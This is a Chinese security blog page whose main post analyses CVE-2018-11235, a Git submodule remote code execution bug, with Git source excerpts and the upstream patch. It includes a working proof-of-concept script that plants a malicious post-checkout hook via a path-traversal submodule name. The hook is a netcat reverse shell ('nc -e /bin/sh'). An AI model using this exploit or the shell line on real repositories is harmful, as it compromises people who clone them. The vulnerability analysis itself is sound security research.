<!doctype html>



  


<html class="theme-next muse use-motion" lang="zh-Hans">

<head>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>



<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />






  <meta name="baidu-site-verification" content="cqIhQLk06F" />







  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />


  <meta name="keywords" content="Hexo, NexT" />





  <link rel="alternate" href="/atom.xml" title="Chybeta" type="application/atom+xml" />




  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0" />






<meta property="og:type" content="website">
<meta property="og:title" content="Chybeta">
<meta property="og:url" content="http://chybeta.github.io/index.html">
<meta property="og:site_name" content="Chybeta">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Chybeta">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Muse',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: 'undefined',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://chybeta.github.io/"/>





  <title> Chybeta </title>
  <!-- Google AdSense start -->
  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<script>
  (adsbygoogle = window.adsbygoogle || []).push({
    google_ad_client: "ca-pub-3467872413268634",
    enable_page_level_ads: true
  });
</script>
  <!-- Google AdSense end -->
  <meta name="baidu_union_verify" content="4dcd229ee2a964611d56cf139346dc50"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  



  <!-- hexo-inject:begin --><!-- hexo-inject:end --><script type="text/javascript">
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?c9c37af8d1f8c5ce0455bd146b47dd7c";
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(hm, s);
    })();
  </script>








  
  
    
  

  <div class="container one-collumn sidebar-position-left 
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-meta ">
  

  <div class="custom-logo-site-title">
    <a href="/"  class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Chybeta</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
            
            归档
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-link">
          <a href="/link" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br />
            
            朋友
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
            
            关于我
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup">
 <span class="search-icon fa fa-search"></span>
 <input type="text" id="local-search-input">
 <div id="local-search-result"></div>
 <span class="popup-btn-close">close</span>
</div>


    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/3017/07/26/一些文章/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/3017/07/26/一些文章/" itemprop="url">
                  一些文章
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="3017-07-26T19:27:04+08:00">
                3017-07-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/随笔/" itemprop="url" rel="index">
                    <span itemprop="name">随笔</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          
             <span id="/3017/07/26/一些文章/" class="leancloud_visitors" data-flag-title="一些文章">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>一些自己写的文章。<br>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/3017/07/26/一些文章/#more" rel="contents">
              阅读全文 &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
  </div>
      <div>
      
    </div>
	<div>
      
	</div>
    <div>
      
    </div>




    <footer class="post-footer">
      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://chybeta.github.io/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="chybeta">
    <meta itemprop="description" content="">
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Chybeta">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Chybeta" src="">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/" itemprop="url">
                  RCE with Git submodule分析-【CVE-2018-11235】
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-05-31T16:25:02+08:00">
                2018-05-31
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Bin-Security/" itemprop="url" rel="index">
                    <span itemprop="name">Bin Security</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          
             <span id="/2018/05/31/RCE-with-Git-submodule分析-【CVE-2018-11235】/" class="leancloud_visitors" data-flag-title="RCE with Git submodule分析-【CVE-2018-11235】">
               <span class="post-meta-divider">|</span>
               <span class="post-meta-item-icon">
                 <i class="fa fa-eye"></i>
               </span>
               
                 <span class="post-meta-item-text">阅读次数 </span>
               
                 <span class="leancloud-visitors-count"></span>
             </span>
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><a href="https://xz.aliyun.com/t/2371" target="_blank" rel="external">RCE with Git submodule 分析-【CVE-2018-11235】</a></p>
<h1 id="漏洞公告"><a href="#漏洞公告" class="headerlink" title="漏洞公告"></a>漏洞公告</h1><p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235" target="_blank" rel="external">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11235</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dac66d0a-67bd-1.png" alt="1.png"></p>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>Github上已经放出了<a href="https://github.com/Rogdham/CVE-2018-11235" target="_blank" rel="external">Rogdham/CVE-2018-11235</a>，原POC还需要git clone Spoon-Knife，对此我做了一些小修改。可以见<a href="https://github.com/CHYbeta/CVE-2018-11235-DEMO" target="_blank" rel="external">CVE-2018-11235-DEMO</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git clone https://github.com/CHYbeta/CVE-2018-11235-DEMO.git</div><div class="line">./build.sh</div></pre></td></tr></table></figure>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-dae0b0f2-67bd-1.gif" alt="demo.gif"></p>
<p>个人本地测试Git版本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">chybeta@ubuntu  ~/CVE-2018-11235  git --version</div><div class="line">git version 2.17.0</div></pre></td></tr></table></figure></p>
<p>其中 build.sh　主要内容如下：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/bin/bash</span></div><div class="line"></div><div class="line"><span class="built_in">set</span> <span class="_">-e</span></div><div class="line"></div><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div><div class="line"></div><div class="line">repo_par=<span class="string">"<span class="variable">$PWD</span>/repo_par"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_par</span>"</span></div><div class="line"></div><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div><div class="line"></div><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div><div class="line"></div><div class="line">git config <span class="_">-f</span> .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div><div class="line"></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span></div><div class="line"></div><div class="line">git commit -m <span class="string">"CVE-2018-11235"</span></div><div class="line"></div><div class="line"><span class="built_in">echo</span> <span class="string">"git clone --recurse-submodules \"<span class="variable">$repo_par</span>\" dest_dir"</span></div></pre></td></tr></table></figure></p>
<p>vuln.sh:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#!/bin/bash</div><div class="line">nc -e /bin/sh 127.0.0.1 12345</div></pre></td></tr></table></figure></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>在Git中存在<a href="https://git-scm.com/book/zh/v1/%E8%87%AA%E5%AE%9A%E4%B9%89-Git-Git%E6%8C%82%E9%92%A9" target="_blank" rel="external">Git Hooks</a>的操作，它们被存放在一个repo的<code>.git</code>目录下的hooks文件目录下：</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-daf553fe-67bd-1.png" alt="2.png"></p>
<p>当配置了这些hooks后，其本质上是脚本文件，会被Git所调用。以<code>post-checkout</code>挂钩为例，如果在hooks中存在一个<code>post-checkout</code>脚本，则当在该repo中执行<code>git checkout</code>指令时，则会自动的去执行hooks目录下的<code>post-checkout</code>脚本。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db0bfa6e-67bd-1.png" alt="3.png"></p>
<p>正常情况下，这些hook脚本并不会在clone期间进行传送。也就是说这些脚本是由客户端自己定制的。否则的话，服务端直接在repo中插入hook文件则直接造成了RCE。如下测试，clone的repo3中的hook目录中是没有<code>post-checkout</code>脚本的:</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db25903c-67bd-1.png" alt="4.png"></p>
<p>而此次的RCE则是利用了Git的子模块功能，绕过了hook文件的限制。通过对子模块配置，将hook文件推送到了客户端中，从而造成RCE。</p>
<p>先介绍一下submodules即子模块。在一些项目中，项目本身需要包含并使用另外一个项目，而这两个项目又是相互独立的。为了保持提交的独立等，可以在Git中使用子模块submodules来解决。</p>
<p>以前面的build.sh中的内容为例：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">repo_sub=<span class="string">"repo_sub"</span></div><div class="line">git init <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line"><span class="built_in">cd</span> <span class="string">"<span class="variable">$repo_sub</span>"</span></div><div class="line">touch chybeta</div><div class="line">git add chybeta</div><div class="line">git commit -m <span class="string">"test"</span></div><div class="line"><span class="built_in">cd</span> ..</div></pre></td></tr></table></figure></p>
<p>这里我们创建了一个仓库repo_sub，接着通过<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">repo_submodule=<span class="string">'./../repo_sub'</span></div><div class="line">git submodule add <span class="string">"<span class="variable">$repo_submodule</span>"</span> vuln</div></pre></td></tr></table></figure></p>
<p>将repo_sub作为子模块添加到了仓库repo_par中，同时指定了路径<code>vuln</code>(即别名)。</p>
<p>在<a href="https://git-scm.com/docs/gitsubmodules" target="_blank" rel="external">Git文档:gitsubmodules</a>中提到：</p>
<blockquote>
<blockquote>
<p>On the filesystem, a submodule usually (but not always - see FORMS below) consists of (i) a Git directory located under the $GIT_DIR/modules/ directory of its superproject, (ii) a working directory inside the superproject’s working directory, and a .git file at the root of the submodule’s working directory pointing to (i).</p>
</blockquote>
</blockquote>
<p>对于子模块而言，通常情况下，子模块的Git目录存放在<code>$GIT_DIR/modules/</code>中，而其工作目录即父项目的工作目录，同时在工作目录下还有一个<code>.git</code>文件来指向其Git目录。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140935-db3c1578-67bd-1.png" alt="7.png"></p>
<p>当添加子模块完成后，在repo_par中会出现<code>.gitmodules</code>文件，该配置文件保存了项目 URL 与已经拉取的本地目录之间的映射。</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db4bf8d0-67bd-1.png" alt="5.png"></p>
<p><code>.gitmodules</code>文件同样受到版本控制的影响，会一起进行推送。这样clone的用户才知道去哪里拉取具体的子模块内容。它的文件格式可以见<a href="https://git-scm.com/docs/gitmodules" target="_blank" rel="external">官方文档gitmodules</a>：</p>
<p>这里对子模块<code>vuln</code>而言，它的<code>name</code>就是<code>vuln</code>,<code>path</code>就是<code>vuln</code>,url即为<code>./../repo_sub</code>。关于这个name，在官方文档中有这样一些表述：</p>
<blockquote>
<blockquote>
<p>The file contains one subsection per submodule, and the subsection value is the name of the submodule. The name is set to the path where the submodule has been added unless it was customized with the —name option of git submodule add. Each submodule section also contains the following required keys….</p>
</blockquote>
</blockquote>
<p>接下来以git version 2.17.0为例，根据Git源代码看看漏洞的触发点。当repo存在submodule时，会从<code>.gitmodules</code>文件中读取相关信息，并将信息保存到cache中以节省资源。在submodule-config.c第563行<code>gitmodules_cb</code>的最后将会调用<code>parse_config</code>对<code>.gitmodules</code>进行解析：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">gitmodules_cb</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> repository *repo = data;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter parameter;</div><div class="line"></div><div class="line">	parameter.cache = repo-&gt;submodule_cache;</div><div class="line">	parameter.treeish_name = <span class="literal">NULL</span>;</div><div class="line">	parameter.gitmodules_sha1 = null_sha1;</div><div class="line">	parameter.overwrite = <span class="number">1</span>;</div><div class="line"></div><div class="line">	<span class="keyword">return</span> parse_config(var, value, &amp;parameter);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>submodule-config.c第362行：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">parse_config</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">const</span> <span class="keyword">char</span> *value, <span class="keyword">void</span> *data)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> parse_config_parameter *me = data;</div><div class="line">	<span class="keyword">struct</span> submodule *submodule;</div><div class="line">	<span class="keyword">struct</span> strbuf name = STRBUF_INIT, item = STRBUF_INIT;</div><div class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</div><div class="line"></div><div class="line">	<span class="comment">/* this also ensures that we only parse submodule entries */</span></div><div class="line">	<span class="keyword">if</span> (!name_and_item_from_var(var, &amp;name, &amp;item))</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">   	submodule = lookup_or_create_by_name(me-&gt;cache,</div><div class="line">					     me-&gt;gitmodules_sha1,</div><div class="line">					     name.buf);</div><div class="line">    ....</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>name_and_item_from_var(var, &amp;name, &amp;item)</code>用于从变量<code>var</code>中获得name值，具体代码如下<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// submodule-config.c</span></div><div class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">name_and_item_from_var</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *var, <span class="keyword">struct</span> strbuf *name,</span></span></div><div class="line">				  <span class="keyword">struct</span> strbuf *item)</div><div class="line">&#123;</div><div class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *subsection, *key;</div><div class="line">	<span class="keyword">int</span> subsection_len, parse;</div><div class="line">	parse = parse_config_key(var, <span class="string">"submodule"</span>, &amp;subsection,</div><div class="line">			&amp;subsection_len, &amp;key);</div><div class="line">	<span class="keyword">if</span> (parse &lt; <span class="number">0</span> || !subsection)</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">	strbuf_add(name, subsection, subsection_len);</div><div class="line">	strbuf_addstr(item, key);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>假设<code>.gitmodules</code>中内容为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[submodule &quot;vuln&quot;]</div><div class="line">	path = vuln</div><div class="line">	url = ./../repo_sub</div></pre></td></tr></table></figure></p>
<p>则通过parse_config_key解析出来的subsection会通过strbuf_add被添加到name中，即此时name的值为<code>vuln</code></p>
<p>回到<code>parse_config</code>中，此后将通过<code>lookup_or_create_by_name(me-&gt;cache,me-&gt;gitmodules_sha1,name.buf)</code>获取子模块的信息并进行一系列操作。</p>
<p>在 <code>submodule.c</code>第1617行，代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">submodule_move_head</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *path,</span></span></div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *old_head,</div><div class="line">			 <span class="keyword">const</span> <span class="keyword">char</span> *new_head,</div><div class="line">			 <span class="keyword">unsigned</span> flags)</div><div class="line">&#123;</div><div class="line">	...</div><div class="line">	<span class="comment">// 第 1617 行</span></div><div class="line">	<span class="keyword">if</span> (!(flags &amp; SUBMODULE_MOVE_HEAD_DRY_RUN)) &#123;</div><div class="line">		<span class="keyword">if</span> (old_head) &#123;</div><div class="line">			<span class="keyword">if</span> (!submodule_uses_gitfile(path))</div><div class="line">				absorb_git_dir_into_superproject(<span class="string">""</span>, path,</div><div class="line">					ABSORB_GITDIR_RECURSE_SUBMODULES);</div><div class="line">		&#125; <span class="keyword">else</span> &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line"></div><div class="line">			<span class="comment">/* make sure the index is clean as well */</span></div><div class="line">			submodule_reset_index(path);</div><div class="line">		&#125;</div><div class="line"></div><div class="line">		<span class="keyword">if</span> (old_head &amp;&amp; (flags &amp; SUBMODULE_MOVE_HEAD_FORCE)) &#123;</div><div class="line">			<span class="keyword">char</span> *gitdir = xstrfmt(<span class="string">"%s/modules/%s"</span>,</div><div class="line">				    get_git_common_dir(), sub-&gt;name);</div><div class="line">			connect_work_tree_and_git_dir(path, gitdir);</div><div class="line">			<span class="built_in">free</span>(gitdir);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这通过<code>xstrfmt(&quot;%s/modules/%s&quot;,get_git_common_dir(), sub-&gt;name)</code>来获得子模块的Git目录。在正常情况下，对于子模块 vuln 而言，<code>get_git_common_dir</code>即父repo的Git目录，即<code>.git</code>。<code>sub-&gt;name</code>即前面获得的name值。拼接完成后子模块的Git目录即为<code>.git/modules/vuln</code></p>
<p>但从前面的代码看来，对于<code>name</code>和<code>sub-&gt;name</code>，Git并没有做相关的输入检查/路径检查。如果我们通过设置<code>name</code>为<code>../../vuln</code>，则拼接后的路径即<code>.git/modules/../../vuln</code>，即当前目录下的<code>vuln</code>目录。这里存在一个目录穿越漏洞，之后的解析将把当前目录下的<code>vuln</code>目录当做子模块的Git目录。</p>
<p>前面说到，<code>.git/hooks</code>目录中的hook脚本并不会在clone期间进行传送。结合目录穿越漏洞，我们考虑这样的攻击方式:</p>
<ol>
<li>将目录<code>.git/modules/vuln</code>拷贝到当前目录<code>modules</code>下。</li>
<li>往<code>modules/vuln</code>目录中的hooks目录添加hook脚本</li>
<li>构造子模块，使其name成为<code>../../modules/vuln</code>，使子模块的Git目录信息指向当前目录下<code>module/vuln</code></li>
<li>构造repo，使其在git clone时触发hook脚本</li>
</ol>
<p>先考虑前2条，即对应build.sh中下述代码<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mkdir modules</div><div class="line">cp -r .git/modules/vuln modules</div><div class="line">cp ../vuln.sh modules/vuln/hooks/post-checkout</div><div class="line">git add modules</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db698576-67bd-1.png" alt="8.png"></p>
<p>第三条：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git config -f .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db7682ee-67bd-1.png" alt="9.png"></p>
<p>第四点，为了让<code>.git/modules/../../modules/vuln</code>即<code>modules/vuln</code>下的hooks目录中的hook脚本被调用，执行下述语句：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git submodule add &quot;$repo_submodule&quot;</div><div class="line">git commit -m &quot;CVE-2018-11235&quot;</div></pre></td></tr></table></figure></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-db854040-67bd-1.png" alt="10.png"></p>
<p>再添加一个子模块。当Git地进行<code>git clone --recurse-submodules</code>时，会发现clone下来的目录中已经有了对应的子模块项目，因此实际上不需要clone，只要进行check out就行。而在check out时则会调用post-checkout脚本。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dba256e4-67bd-1.png" alt="11.png"></p>
<p>上述的分析针对 git version 2.17.0 进行。在一些低版本的Git中，由于功能等差异，可能上述环境会出错。Tony Torralba在其博客中复现了Git 2.7.4版本的漏洞，需要利用符号链接来进行RCE，具体的利用过程见 <a href="https://atorralba.github.io/CVE-2018-11235/" target="_blank" rel="external">CVE-2018-11235 - Quick &amp; Dirty PoC</a></p>
<h1 id="补丁浅析"><a href="#补丁浅析" class="headerlink" title="补丁浅析"></a>补丁浅析</h1><p>补丁见：<a href="https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44" target="_blank" rel="external">https://github.com/git/git/commit/0383bbb9015898cbc79abd7b64316484d7713b44</a></p>
<p>主要是对从<code>.gitmodules</code>中获取的name进行了检查</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180604140936-dbbd8cac-67bd-1.png" alt="12.png"></p>
<p>在<code>name_and_item_from_var(var, &amp;name, &amp;item)</code>函数中调用了<code>check_submodule_name</code>来进行检查：</p>
